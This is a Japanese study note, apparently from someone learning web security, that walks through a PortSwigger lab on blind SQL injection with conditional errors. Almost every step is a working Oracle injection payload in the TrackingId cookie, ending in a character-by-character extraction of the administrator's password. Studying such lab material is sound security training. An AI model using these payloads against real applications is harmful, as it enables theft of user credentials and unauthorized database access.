Date: 2025-09-10
Tags: 
Links: [[WSA]], [[SQL]]
***

 真偽値が振る舞いに影響しないとき。
 エラーなら見えるかもしれない。
→条件が真の時エラーを起こすようにする。

例：
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

>連結子を使えばandである必要はない。andは条件式を繋げる。

***
## Lab: Blind SQL injection with conditional errors


**1. エラーが起こる**
```sql
TrackingId=xyz'
````

 **2. エラーが消える**
```sql
TrackingId=xyz''
```

**3. SQLクエリによるエラーだと確認（エラーが起こる）**
```sql
TrackingId=xyz'||(SELECT '')||'
```
>サブクエリは（）で囲まないといけない。

**4. Oracle特有の dual を指定してエラーが消える**
```sql
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

**5. 存在しないテーブルでエラーが起こる**
```sql
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

**6. users テーブルの存在を確認（エラーなし）**
```sql
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

>Oracle では ROWNUM は 行が返される順番に割り振られるため、
>WHERE ROWNUM = 1 は 最初に見つかった 1 行だけ に制限される。

**7. 条件によるエラーの確認**
- 真のとき → エラー
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

>TO_CHARはwyzと確実に連結するため
>重要

- 偽のとき → エラーなし
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**8. administrator ユーザの存在確認（エラーあり → 存在する）**
```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```

**9. パスワード長の確認**
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```
→ 値を増やしながらエラーが消える箇所を探す。結果：**20文字**


 **10. 各文字を特定**
1文字目を 'a' と比較
```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```
- Burp Intruder で a-z0-9 をペイロードに設定し、HTTP 500 が返る値を特定
- オフセットを 2, 3, … と進めて全20文字を抽出

***
# References

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors